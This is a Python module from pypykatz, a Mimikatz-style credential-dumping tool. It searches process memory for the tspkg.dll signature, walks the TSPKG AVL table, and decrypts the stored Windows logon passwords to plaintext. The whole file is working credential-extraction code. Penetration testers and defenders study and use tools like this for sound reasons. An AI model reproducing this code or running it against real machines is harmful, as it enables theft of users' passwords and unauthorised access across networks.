#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#
import io
import logging

from pypykatz.lsadecryptor.package_commons import *

class TspkgCredential:
	def __init__(self):
		self.credtype = 'tspkg'
		self.username = None
		self.domainname = None
		self.password = None
		self.luid = None
	
	def to_dict(self):
		t = {}
		t['credtype'] = self.credtype
		t['username'] = self.username
		t['domainname'] = self.domainname
		t['password'] = self.password
		t['luid'] = self.luid
		return t
	def to_json(self):
		return json.dumps(self.to_dict())
		
	def __str__(self):
		t = '\t== TSPKG [%x]==\n' % self.luid
		t += '\t\tusername %s\n' % self.username
		t += '\t\tdomainname %s\n' % self.domainname
		t += '\t\tpassword %s\n' % self.password
		return t
		
class TspkgDecryptor(PackageDecryptor):
	def __init__(self, reader, decryptor_template, lsa_decryptor):
		super().__init__('Tspkg')
		self.reader = reader
		self.decryptor_template = decryptor_template
		self.lsa_decryptor = lsa_decryptor
		self.credentials = []
		
	def find_signature(self):
		logging.log(1, '[TspkgDecryptor] Searching for key struct signature')
		fl = self.reader.find_in_module('tspkg.dll',self.decryptor_template.signature)
		if len(fl) == 0:
			raise Exception('[TspkgDecryptor] Signature was not found! %s' % self.decryptor_template.signature.hex())
		return fl[0]

	def find_first_entry(self):
		position = self.find_signature()
		ptr_entry_loc = self.reader.get_ptr_with_offset(position + self.decryptor_template.avl_offset)
		ptr_entry = self.reader.get_ptr(ptr_entry_loc)
		return ptr_entry, ptr_entry_loc
	
	def start(self):
		try:
			entry_ptr_value, entry_ptr_loc = self.find_first_entry()
		except Exception as e:
			logging.log(1,'Failed to find Tspkg structs! Reason: %s' % e)
			return
		result_ptr_list = []
		self.reader.move(entry_ptr_value)
		start_node = PRTL_AVL_TABLE(self.reader).read(self.reader)
		self.walk_avl(start_node.BalancedRoot.RightChild, result_ptr_list)
		for ptr in result_ptr_list:
			self.log_ptr(ptr, self.decryptor_template.credential_struct.__name__, datasize= 0x100)
			self.reader.move(ptr)
			credential_struct = self.decryptor_template.credential_struct(self.reader)
			primary_credential = credential_struct.pTsPrimary.read(self.reader)
			
			c = TspkgCredential()
			c.luid = credential_struct.LocallyUniqueIdentifier
			c.username = primary_credential.credentials.UserName.read_string(self.reader)
			c.domainname = primary_credential.credentials.Domaine.read_string(self.reader)
			if primary_credential.credentials.Password.Length != 0:
				if primary_credential.credentials.Password.Length % 8 != 0:
					#for orphaned creds
					c.password = primary_credential.credentials.Password.read_data(self.reader)
				else:
					enc_data = primary_credential.credentials.Password.read_data(self.reader)
					dec_data = self.lsa_decryptor.decrypt(enc_data)
					try:
						c.password = dec_data.decode('utf-16-le').rstrip('\x00')
					except:
						c.password = dec_data.hex()
						pass
					
			
			self.credentials.append(c)